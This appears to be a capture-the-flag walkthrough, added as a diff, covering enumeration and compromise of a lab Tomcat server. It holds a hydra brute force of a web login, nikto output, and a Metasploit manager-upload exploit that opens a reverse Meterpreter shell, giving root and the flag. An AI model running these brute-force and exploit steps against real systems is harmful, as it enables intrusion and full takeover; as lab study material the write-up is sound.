@@ -1,0 +1,152 @@
+ENUMERATION
+
+nmap 10.10.225.249 -v
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+BRUTE FORCE WEB PORTAL
+hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.201.221 http-get-form "/guidelines:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect."
+
+WEB DIRECTORY DISCOVERY
+dirb 10.10.201.221 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+ENUMERATE WEBSITE
+nikto -h http://10.10.201.221:1234 -id bob:bubbles
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.201.221
++ Target Hostname:    10.10.201.221
++ Target Port:        1234
++ Start Time:         2020-10-11 15:34:25 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache-Coyote/1.1
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0xW/21630 0x1525702562000 
++ OSVDB-39272: favicon.ico file identifies this server as: Apache Tomcat
++ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
++ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
++ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
++ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
++ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
++ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
++ /host-manager/html: Tomcat Manager / Host Manager interface found (pass protected)
++ /manager/status: Tomcat Server Status interface found (pass protected)
++ 7521 requests: 0 error(s) and 14 item(s) reported on remote host
++ End Time:           2020-10-11 15:37:42 (GMT-4) (197 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+EXPLOITATION
+
+msf exploit(multi/handler) > search tomcat
+
+Matching Modules
+================
+
+   Name                                                         Disclosure Date  Rank       Description
+   ----                                                         ---------------  ----       -----------
+   auxiliary/admin/http/tomcat_administration                                    normal     Tomcat Administration Tool Default Access
+   auxiliary/admin/http/tomcat_utf8_traversal                   2009-01-09       normal     Tomcat UTF-8 Directory Traversal Vulnerability
+   auxiliary/admin/http/trendmicro_dlp_traversal                2009-01-09       normal     TrendMicro Data Loss Prevention 5.5 Directory Traversal
+   auxiliary/dos/http/apache_commons_fileupload_dos             2014-02-06       normal     Apache Commons FileUpload and Apache Tomcat DoS
+   auxiliary/dos/http/apache_tomcat_transfer_encoding           2010-07-09       normal     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
+   auxiliary/dos/http/hashcollision_dos                         2011-12-28       normal     Hashtable Collisions
+   auxiliary/scanner/http/tomcat_enum                                            normal     Apache Tomcat User Enumeration
+   auxiliary/scanner/http/tomcat_mgr_login                                       normal     Tomcat Application Manager Login Utility
+   exploit/multi/http/struts_code_exec_classloader              2014-03-06       manual     Apache Struts ClassLoader Manipulation Remote Code Execution
+   exploit/multi/http/struts_dev_mode                           2012-01-06       excellent  Apache Struts 2 Developer Mode OGNL Execution
+   exploit/multi/http/tomcat_jsp_upload_bypass                  2017-10-03       excellent  Tomcat RCE via JSP Upload Bypass
+   exploit/multi/http/tomcat_mgr_deploy                         2009-11-09       excellent  Apache Tomcat Manager Application Deployer Authenticated Code Execution
+   exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Apache Tomcat Manager Authenticated Upload Code Execution
+   exploit/multi/http/zenworks_configuration_management_upload  2015-04-07       excellent  Novell ZENworks Configuration Management Arbitrary File Upload
+   post/multi/gather/tomcat_gather                                               normal     Gather Tomcat Credentials
+   post/windows/gather/enum_tomcat                                               normal     Windows Gather Apache Tomcat Enumeration
+
+
+msf exploit(multi/handler) > use exploit/multi/http/tomcat_mgr_upload 
+msf exploit(multi/http/tomcat_mgr_upload) > show options
+
+Module options (exploit/multi/http/tomcat_mgr_upload):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   HttpPassword                   no        The password for the specified username
+   HttpUsername                   no        The username to authenticate as
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST                          yes       The target address
+   RPORT         80               yes       The target port (TCP)
+   SSL           false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
+   VHOST                          no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Java Universal
+
+
+msf exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
+HttpPassword => bubbles
+msf exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
+HttpUsername => bob
+msf exploit(multi/http/tomcat_mgr_upload) > set RHOST 10.10.201.221
+RHOST => 10.10.201.221
+msf exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
+RPORT => 1234
+msf exploit(multi/http/tomcat_mgr_upload) > exploit
+
+[*] Started reverse TCP handler on 10.11.10.169:4444 
+[*] Retrieving session ID and CSRF token...
+[*] Uploading and deploying TEg7WXTfdxLYPVY8YqpcG9...
+[*] Executing TEg7WXTfdxLYPVY8YqpcG9...
+[*] Undeploying TEg7WXTfdxLYPVY8YqpcG9 ...
+[*] Sending stage (53837 bytes) to 10.10.201.221
+[*] Meterpreter session 1 opened (10.11.10.169:4444 -> 10.10.201.221:58238) at 2020-10-11 16:23:50 -0400
+
+meterpreter > ifconfig
+
+Interface  1
+============
+Name         : eth0 - eth0
+Hardware MAC : 02:eb:5b:1c:70:8d
+MTU          : 9001
+IPv4 Address : 10.10.201.221
+IPv4 Netmask : 255.255.0.0
+IPv6 Address : fe80::eb:5bff:fe1c:708d
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+
+Interface  2
+============
+Name         : lo - lo
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 65536
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+meterpreter > pwd
+/
+meterpreter > cat /root/flag.txt
+ff1fc4a81affcc7688cf89ae7dc6e0e1
+meterpreter > getuid
+Server username: root
+
+meterpreter > shell
+Process 1 created.
+Channel 2 created.
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+uname -ar
+Linux ip-10-10-201-221 4.4.0-1075-aws #85-Ubuntu SMP Thu Jan 17 17:15:12 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
